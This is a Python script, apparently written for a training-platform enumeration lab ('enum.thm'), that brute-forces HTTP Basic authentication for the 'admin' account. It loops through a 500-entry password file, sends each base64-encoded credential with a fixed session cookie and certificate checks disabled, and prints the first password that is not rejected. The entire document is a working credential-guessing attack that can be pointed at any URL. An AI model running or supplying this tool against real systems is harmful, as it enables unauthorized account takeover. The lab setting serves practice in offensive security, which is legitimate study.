import requests
import urllib3
import requests
import sys
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #

# ====Verifying Arguments==== #
if len(sys.argv) != 2:
    print(f"# Usage python3 {sys.argv[0]} <URL>")
    sys.exit(1)

url = sys.argv[1]


# ====Creating a python mail list==== #
password_file = "500passwords.txt"
password_list = []

with open(password_file,"r", encoding = 'utf8') as pf:
    for line in pf:
        line = line.strip()
        if not line:
            continue
        else:
            password_list.append(line)


# ====base64 encode==== #
for password in password_list:
    credentials = "admin:"+str(password)
    encoded_credentials = base64.b64encode(credentials.encode()).decode()

    # ==== Defining Headers insie loop ====#
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "http://enum.thm",
        "Connection": "close",
        "Referer": "http://enum.thm/labs/verbose_login/",
        "Authorization": f"Basic {encoded_credentials}"
    }
    cookie = {"PHPSESSID":"rq0i9mcd7dieas84t1ssbfug4r"}

    r = requests.get(url, cookies=cookie, headers=headers, verify=False, allow_redirects=True)
    
    if r.status_code == 401:
        print(f"[-] Unauthorized: {credentials} ")
        continue
    else:
        print(f"(+) The Admin password is: {password}")    
        break
sys.exit(0)
